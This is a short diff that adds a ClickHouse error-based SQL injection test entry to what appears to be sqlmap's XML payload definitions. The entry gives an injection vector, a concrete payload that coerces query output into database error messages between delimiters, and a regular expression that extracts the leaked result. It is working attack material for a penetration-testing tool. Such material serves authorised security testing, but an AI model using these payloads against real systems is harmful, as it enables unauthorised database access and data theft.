@@ -853,6 +853,26 @@
         </details>
     </test>
 
+
+    <test>
+        <title>Clickhouse AND error-based - Parameter replace</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||CAST(([QUERY]), 'String')||'[DELIMITER_STOP]' AS String)</vector>
+        <request>
+            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||CAST((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)), 'String')||'[DELIMITER_STOP]' AS String)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Clickhouse</dbms>
+        </details>
+    </test>
+
     <!--
          TODO: if possible, add payload for SQLite, Microsoft Access,
          and SAP MaxDB - no known techniques at this time
